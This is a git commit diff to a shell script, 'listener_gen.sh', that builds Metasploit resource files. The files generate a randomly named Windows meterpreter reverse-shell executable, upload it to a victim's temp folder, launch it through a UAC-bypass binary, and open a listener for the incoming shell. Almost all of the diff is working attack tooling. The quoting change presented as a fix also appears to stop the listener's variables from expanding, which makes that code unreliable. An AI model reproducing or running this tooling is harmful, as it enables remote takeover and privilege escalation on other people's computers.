20329cd8c57a0073a5bdf727ddc28d5d1d7eb14f
giovi <giovi@example.com>
2026-08-01 03:58:01 +0200

    Fix listener_gen.sh variable expansion

--- listener_gen.sh
+++ listener_gen.sh
@@ -5,7 +5,7 @@ OUTFILE="/tmp/acheron_listener_${PORT}.rc"
 BYPASS_RC="/tmp/bypassuac.rc"
 
 # Generate dynamic bypass UAC script with LHOST/LPORT
-cat > "/tmp/bypassuac.rc" << 'EOF'
+cat > "/tmp/bypassuac.rc" << 'BYPASS_EOF'
 # UAC Bypass Method 59 - Debug Object / PPID Spoofing
 # Run MANUALLY in meterpreter: bypassuac
 
@@ -16,16 +16,16 @@ set PAYLOAD_NAME update_$(date +%s)_$(shuf -i 1000-9999 -n 1).exe
 run generate -f exe -o /tmp/$PAYLOAD_NAME -p windows/x64/meterpreter/reverse_tcp -o LHOST=$LHOST -o LPORT=$PORT
 
 # Upload to victim %TEMP%
-upload /tmp/$PAYLOAD_NAME %TEMP%\$PAYLOAD_NAME
+upload /tmp/$PAYLOAD_NAME %TEMP%\\$PAYLOAD_NAME
 
 # Execute UAC bypass executable with our payload
-execute -f C:\Windows\Temp\uacbypass.exe -a "%TEMP%\$PAYLOAD_NAME" -H -i
+execute -f C:\\Windows\\Temp\\uacbypass.exe -a "%TEMP%\\$PAYLOAD_NAME" -H -i
 
 # Clean up
 rm /tmp/$PAYLOAD_NAME
-EOF
+BYPASS_EOF
 
-cat > "$OUTFILE" << RC
+cat > "$OUTFILE" << 'RC'
 use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST $LHOST
@@ -37,5 +37,7 @@ exploit -j -z
 RC
 
 # Removed alias script generation - user will run bypassuac manually
-echo "[*] Run: msfconsole -r \$OUTFILE" >&2
+echo "[*] Run: msfconsole -r $OUTFILE" >&2
 echo "[*] UAC bypass manuale: in meterpreter digita 'bypassuac' (esegue /tmp/bypassuac.rc)" >&2
+# Output ONLY the file path to stdout (for capture)
+echo "$OUTFILE"
